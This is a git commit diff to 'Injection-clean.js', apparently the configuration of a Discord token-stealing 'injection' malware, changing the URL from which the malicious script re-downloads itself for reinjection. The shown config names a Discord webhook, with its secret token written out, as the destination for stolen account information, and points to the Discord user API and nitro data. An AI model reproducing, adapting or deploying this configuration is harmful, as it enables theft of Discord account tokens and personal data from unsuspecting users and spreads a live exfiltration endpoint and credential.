2c66b740d9653baeb8861bb91d79cf2657e4ebbb
AiOhto165 <104061599+AiOhto165@users.noreply.github.com>
2022-04-21 17:08:37 +0300

    Update Injection-clean.js

--- Injection-clean.js
+++ Injection-clean.js
@@ -16,7 +16,7 @@ const config = {
     ), //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
   embed_color: 8363488, //color for the embed, needs to be hexadecimal (just copy a hex and then use https://www.binaryhexconverter.com/hex-to-decimal-converter to convert it)
   webhook: "https://discord.com/api/webhooks/966689527236292670/zM5AnLTWdyXgASzRuEBZmApggP_iFyD9OLwwhuFWb4L5650_Bu2BasTPuLU6eY7VbY63", //your discord webhook there obviously
-  injection_url: "https://raw.githubusercontent.com/Rdimo/Discord-Injection/master/injection.js", //injection url for when it reinjects
+  injection_url: "https://github.com/AiOhto165/Beta/blob/master/injection.js", //injection url for when it reinjects
   /* DON'T TOUCH UNDER HERE IF UNLESS YOU'RE MODIFYING THE INJECTION OR KNOW WHAT YOU'RE DOING */
   api: "https://discord.com/api/v9/users/@me",
   nitro: {
